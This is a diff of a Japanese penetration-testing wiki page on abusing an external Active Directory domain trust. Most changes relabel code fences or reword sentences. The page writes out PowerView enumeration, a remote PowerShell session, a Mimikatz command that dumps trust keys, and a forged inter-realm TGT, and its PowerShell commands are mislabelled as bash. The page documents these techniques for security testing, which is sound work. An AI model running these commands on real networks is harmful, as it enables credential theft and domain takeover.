@@ -7,7 +7,7 @@
 ## 列挙
 
 まず最初に、**信頼**を**列挙**する必要があります：
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -63,7 +63,7 @@ IsDomain     : True
 他のドメインでユーザーの**特別な**アクセスを見つけられなかった場合でも、ADメソッドに戻り、**特権のないユーザーからの昇格**を試みることができます（例えば、kerberoastingなど）：
 
 **Powerview関数**を使用して、`-Domain`パラメータを使って**他のドメイン**を**列挙**できます。
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -74,8 +74,8 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### ログイン
 
-外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でログインすることで、次の内容にアクセスできるはずです：
-```powershell
+外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でアクセスできるはずです:
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID履歴の悪用
@@ -87,11 +87,11 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 > [!WARNING]
 > リマインダーとして、署名キーを取得するには
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-現在のドメインのユーザーを**偽装するTGTを**、**信頼された**キーで**署名する**ことができます。
+**信頼された**キーで**現在のドメインのユーザーを模倣する**TGTに**署名する**ことができます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
